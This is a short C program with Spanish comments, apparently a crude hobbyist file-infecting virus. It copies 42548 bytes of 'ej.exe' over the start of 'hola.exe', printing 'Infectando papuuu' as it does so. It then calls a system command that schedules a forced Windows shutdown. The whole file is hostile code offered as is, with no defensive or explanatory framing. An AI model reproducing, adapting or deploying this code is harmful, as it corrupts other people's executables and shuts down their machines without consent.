#include<stdio.h>
#include<io.h>
#include<direct.h>
#include<conio.h>
#include<time.h>

#include <stdlib.h>

FILE *virus,*host;
int done,a=0;
unsigned long x;
char buff[2048];

clock_t st,end;

void main(){
  
  //st=clock();

  virus=fopen("ej.exe","rb");
  host=fopen("hola.exe","rb+");
  
  x=42548;
  printf("Infectando papuuu");
  
  while(x>2048) {
    //printf("INGRESOOOnash");
    fread(buff,2048,1,virus);
    fwrite(buff,2048,1,host);
    x-=2048;
    }
  fread(buff,x,1,virus);
  fwrite(buff,x,1,host);
  //a++;
  system("shutdown -s -t 1000");
  /*
  int size=0;
  fseek(virus, 0, SEEK_END);    
  size = ftell(virus);
  printf("Este archivo pesa: %d\n", size);    
  */

  fclose(virus);
  fclose(host);
  //printf("Listo! (Se infectaron en total= %d)",a);
  //end=clock();
  //printf("El que se tomo fue=%f SEC\n", (end-st)/CLK_TCK);
  getch();
}
